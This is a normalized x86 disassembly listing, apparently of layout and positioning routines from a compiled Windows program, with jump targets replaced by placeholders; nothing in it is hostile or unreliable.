mov eax [ ebx + 0x44 ]
sub [ ebp - 0x1c ] eax
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_429728
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x60 ]
jg r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x30 ]
je r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov edi [ ebp - 0x14 ]
dec edi
mov eax [ ebp - 0x50 ]
sub eax edi
jg r-xdata
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax [ ebx + 0x16 ]
call sub_412668
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x44 ]
mov eax [ ebp - 0x10 ]
sub edx [ eax + 0x4 ]
sub edx [ ebx + 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
mov ecx [ ebp - 0x10 ]
sub eax [ ecx ]
sub eax [ ebx + 0x4 ]
lea ecx [ ebp - 0xb0 ]
call sub_412618
mov eax [ ebp - 0xb0 ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0xac ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_412668
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_413a74
mov ebx eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x14 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x44 ] eax
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
add eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
dec eax
mov [ ebp - 0x7c ] eax
mov eax esi
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_429728
pop ecx
test al al
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
sub [ ebx + 0x39 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
cmp eax [ ebx + 0x39 ]
jle r-xdata
mov eax esi
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x20 ]
add [ ebp - 0x24 ] eax
add eax [ ebp - 0x40 ]
add [ ebp - 0x20 ] eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
add eax [ ebp - 0x38 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x64 ]
sub [ ebp - 0x24 ] eax
mov eax [ ebp - 0x64 ]
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
cmp eax [ ebp - 0x5c ]
jle r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebx + 0x39 ] eax
push ebp
lea edx [ ebp - 0x3c ]
mov ecx [ ebp - 0x40 ]
mov eax ebx
call sub_429728
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x3c ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0x40 ]
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
sub eax [ ebp - 0x5c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
dec eax
cmp edi eax
jge r-xdata
dec edi
inc [ ebp - 0x7c ]
jne r-xdata
mov eax esi
mov edx [ ebx + 0x16 ]
mov [ eax + 0x16 ] edx
mov edx [ ebx + 0x1a ]
mov [ eax + 0x1a ] edx
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x60 ]
jle r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
mov edx [ ebp - 0x64 ]
sub edx eax
sub [ ebp - 0x60 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_413a74
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x39 ]
cmp eax [ ebp - 0x3c ]
jge r-xdata
mov eax esi
mov edx [ ebx + 0x16 ]
mov [ eax + 0x16 ] edx
mov edx [ ebx + 0x1a ]
mov [ eax + 0x1a ] edx
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x1a ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x20 ]
mov [ eax + 0x20 ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x80 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0x39 ] edx
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x44 ]
sub [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_413a74
mov esi eax
push ebp
mov ecx [ esi + 0x44 ]
lea edx [ esi + 0x39 ]
mov eax esi
call sub_429728
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0x40 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebp - 0x80 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_413a74
mov edx [ eax + 0x16 ]
mov [ esi + 0x16 ] edx
mov edx [ eax + 0x1a ]
mov [ esi + 0x1a ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_413a74
mov edx [ eax + 0x39 ]
mov [ esi + 0x39 ] edx
mov edx [ eax + 0x3d ]
mov [ esi + 0x3d ] edx
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x24 ]
add [ esi + 0x1a ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x24 ]
add [ esi + 0x3d ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_413a74
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_413a74
mov eax [ eax + 0x44 ]
mov [ esi + 0x44 ] eax
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
sub_42a2a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413918
inc edi
xor esi esi
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413af0
jmp r-xdata
mov edx [ ebx + 0x44 ]
cmp edx [ eax + 0x44 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
dec edi
jne r-xdata
mov edx [ ebx + 0x40 ]
cmp edx [ eax + 0x40 ]
jge r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413a74
mov edx [ ebx + 0x44 ]
cmp edx [ eax + 0x44 ]
jl r-xdata
sub_42a304
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x35 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x34 ] eax
xor edx edx
push ebp
push sub_42a6b1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_441698
mov edx eax
mov eax [ ebp - 0x20 ]
call sub_413bd8
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x21 ] 0x0
mov eax ebx
call sub_441698
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0xc ] 0x0
mov al 0x1
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov al [ ebp - 0x35 ]
push eax
push rw-data
push 0xffffffff
push 0xffffffff
push 0x1
lea ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42aa40
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_413a74
lea edx [ ebp - 0x5c ]
call sub_43daec
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov al [ ebp - 0x35 ]
push eax
push rw-data
push 0xffffffff
push 0xffffffff
push 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_413a74
mov edx eax
lea ecx [ ebp - 0x5c ]
mov eax ebx
call sub_42aa40
inc [ ebp - 0xc ]
dec [ ebp - 0x3c ]
jne r-xdata
test [ ebx + 0x1c ] 0x10
setne al
and al [ ebp - 0x19 ]
je r-xdata
inc edi
xor esi esi
xor eax eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a6b8
mov eax [ ebp - 0x20 ]
call sub_403290
mov eax [ ebp - 0x2c ]
call sub_403290
mov eax [ ebp - 0x30 ]
call sub_403290
mov eax [ ebp - 0x34 ]
call sub_403290
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x19 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc esi
dec edi
jne r-xdata
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_413a74
mov eax [ eax ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0x22 ] al
mov [ ebp - 0x19 ] 0x0
mov eax [ ebx + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov edi [ ebx + 0x228 ]
mov eax edi
mov edx esi
call sub_413a74
mov edx eax
mov eax edi
call sub_429594
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_413a74
cmp [ eax + 0x30 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_413a74
mov [ ebp - 0x28 ] eax
mov edi [ ebp - 0x28 ]
mov edx [ edi + 0x8 ]
add edx [ edi + 0x10 ]
mov eax [ ebp - 0x34 ]
call sub_413918
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_413a74
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44165c
mov [ ebp - 0x18 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
call sub_42a2a4
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x4c ]
mov eax [ edi ]
call sub_43daec
mov eax [ edi + 0x1a ]
add eax [ edi + 0x8 ]
mov edx [ edi ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov ecx [ edi + 0x16 ]
add ecx [ edi + 0x20 ]
sub ecx [ edi + 0xc ]
mov eax [ edi + 0x1a ]
add eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x16 ]
add eax [ edi + 0x4 ]
pop edx
call sub_412640
jmp r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov dl [ ebp - 0x11 ]
mov eax [ ebp - 0x2c ]
call sub_413918
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_413918
mov eax [ ebp - 0x28 ]
mov edi [ eax + 0x34 ]
test edi edi
je r-xdata
lea eax [ esi + 0x1 ]
mov edx [ ebx + 0x228 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov al [ edi + 0x15 ]
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
je r-xdata
cmp al [ ebp - 0x22 ]
setne [ ebp - 0x21 ]
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_413a74
mov dl [ ebp - 0x22 ]
mov [ eax + 0x14 ] dl
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov edx [ ebp - 0x28 ]
call sub_429594
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov edx edi
call sub_413ad0
mov esi eax
xor edx edx
mov dl [ edi + 0x15 ]
mov eax [ ebp - 0x2c ]
call sub_413918
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_413918
mov eax edi
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
mov eax [ ebp - 0x34 ]
call sub_413918
cmp [ edi + 0x15 ] 0x0
je r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x228 ]
call sub_413a74
mov edi eax
cmp [ edi + 0x15 ] 0x0
jne r-xdata
mov edi [ edi + 0x34 ]
test edi edi
jne r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x228 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov [ edi + 0x15 ] 0x1
mov [ edi + 0x38 ] 0x1
mov [ ebp - 0x35 ] 0x1
lea edx [ esi + 0x1 ]
call sub_413a74
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x15 ] 0x1
sub_42a6e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp eax
mov eax [ ebp + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_413a74
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_413a74
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
mov eax [ ebx ]
call sub_43daec
mov eax [ esp + 0x8 ]
mov [ ebx + 0x16 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1a ] eax
mov eax [ ebx + 0x4 ]
sub [ ebx + 0x16 ] eax
mov eax [ ebx + 0x8 ]
sub [ ebx + 0x1a ] eax
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x1a ]
mov eax [ ebx + 0x30 ]
add edx [ eax + 0x24 ]
mov ecx esp
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x16 ]
call sub_412618
mov eax [ esp ]
mov [ ebx + 0x16 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1a ] eax
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x20 ] eax
mov al [ ebx + 0x38 ]
mov [ ebx + 0x15 ] al
sub_42a7a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] ecx
mov ebp edx
mov ebx eax
mov [ esp + 0x4 ] 0x1
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
call sub_441698
test eax eax
jle r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ ebx + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
mov [ ebp ] eax
mov eax [ ebx + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_43db94
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax [ esp ]
add [ eax ] edx
inc esi
xor edi edi
mov eax ebx
call sub_43db50
mov edx [ ebx + 0x48 ]
sub edx eax
add [ ebp ] edx
jmp r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc edi
dec esi
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_413a74
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ eax + 0x3d ]
mov ecx [ eax ]
add edx [ ecx + 0x4c ]
add edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
mov ecx [ esp ]
cmp edx [ ecx ]
jle r-xdata
mov edx [ eax ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_413a74
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ eax ]
mov edx [ edx + 0x48 ]
add edx [ eax + 0x39 ]
add edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
cmp edx [ ebp ]
jle r-xdata
mov edx [ eax ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
mov eax [ esp ]
mov [ eax ] edx
mov edx [ eax ]
mov edx [ edx + 0x48 ]
add edx [ eax + 0x39 ]
add edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
mov [ ebp ] edx
sub_42a8c4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x5 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x10 ]
mov edx [ edx + 0x228 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x15 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x1d ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x230 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x228 ]
call sub_413a74
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x228 ]
mov ecx ebx
call sub_413af0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x1
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov [ eax + 0x34 ] ebx
mov edx [ ebp + 0x8 ]
add edx 0xffffffdf
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x19 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x21 ]
push edx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffc7
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x29 ]
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x5 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_429514
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x15 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
dec [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x230 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x1d ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x20 ]
push eax
push ebx
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffc7
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x21 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42aa40
mov [ ebx + 0x15 ] 0x0
mov [ ebx + 0x38 ] 0x0
sub_42aa40
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov esi [ ebp + 0x14 ]
lea edi [ ebp - 0x39 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x214 ] edx
mov eax [ ebp + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x0
xor edx edx
mov eax [ ebp + 0x28 ]
call sub_413a74
mov [ ebp - 0x4d ] al
xor edx edx
mov eax [ ebp + 0x28 ]
call sub_413964
jmp r-xdata
mov [ ebp - 0xc ] 0xffffffff
xor edx edx
mov eax [ ebp + 0x24 ]
call sub_413a74
mov [ ebp - 0xc ] eax
xor edx edx
mov eax [ ebp + 0x24 ]
call sub_413964
jmp r-xdata
mov eax [ ebp + 0x24 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
or ebx 0xffffffff
xor edx edx
mov eax [ ebp + 0x20 ]
call sub_413a74
mov ebx eax
xor edx edx
mov eax [ ebp + 0x20 ]
call sub_413964
jmp r-xdata
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp + 0x10 ] eax
mov esi rw-data
lea edi [ ebp - 0x39 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
test ebx ebx
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x40 ] 0x80000001
mov [ ebp - 0x44 ] 0x80000001
push esi
lea edi [ ebp - 0x21 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov al 0x1
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
add ebx [ ebp - 0x15 ]
sub ebx [ ebp - 0x1d ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov ebx [ ebp - 0x35 ]
add ebx [ ebp - 0x2d ]
push ebp
call sub_42a8c4
pop ecx
inc eax
mov [ ebp - 0x54 ] eax
xor esi esi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] 0x1
mov eax [ ebp - 0x10 ]
push [ eax + 0x230 ]
mov eax ebx
pop edx
mov ecx edx
cdq
idiv ecx
mov [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x44 ]
jle r-xdata
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x29 ] al
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
shr eax 0x1
add eax [ ebp - 0x1d ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x234 ]
and al [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0xc ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebp + 0xc ]
mov eax [ ebp - 0x21 ]
cmp eax [ ebp - 0x64 ]
jle r-xdata
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x21 ]
add eax [ ebp + 0x10 ]
mov [ ebp - 0x19 ] eax
lea edx [ ebp - 0x39 ]
lea eax [ ebp - 0x21 ]
call sub_4295bc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
